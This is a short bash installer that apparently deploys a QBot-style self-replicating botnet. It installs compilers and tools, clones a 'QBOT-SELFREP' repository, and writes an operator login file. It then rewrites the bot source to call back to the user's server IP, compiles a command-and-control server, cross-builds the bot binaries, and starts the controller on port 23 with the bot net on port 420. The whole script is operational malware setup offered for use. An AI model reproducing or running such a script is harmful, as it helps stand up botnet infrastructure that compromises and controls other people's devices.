#!/usr/bin/bash
clear
echo "Installing Dependancies"
sleep 1
yum install python3
apt-get install python3
yum install python2
apt-get install python2
yum install python
apt-get install python
yum install python-pip
apt-get install python-pip
yum install python-paramiko
apt-get install python-paramiko
sleep 1 
clear

yum install nano
apt-get install nano
yum install screen
apt-get install screen
yum install gcc
apt-get install gcc
yum install perl 
apt-get install perl
yum install wget
apt-get install wget
yum install lbzip
apt-get install lbzip
yum install unzip
apt-get install unzip
yum install sed
apt-get install sed
sleep 1
clear

git clone https://github.com/WineSec/QBOT-SELFREP.git
cd QBOT-SELFREP
chmod 777 *

echo Enter your server ip:
read ServerIp
echo Enter desired username:
read User
echo Enter desired password:
read Pass

echo $User $Pass > login.txt

sed -i 's/45.76.29.203/'$ServerIp'/g' yakuza.c

gcc server.c -o StartServer -pthread
python cc7.py yakuza.c $ServerIp
sleep 1
clear

echo screening port 23
echo net is on port 420 raw
screen ./StartServer 23 500 420
echo "if the screen terminates just run ./startserver 23 500 420"
sleep 5



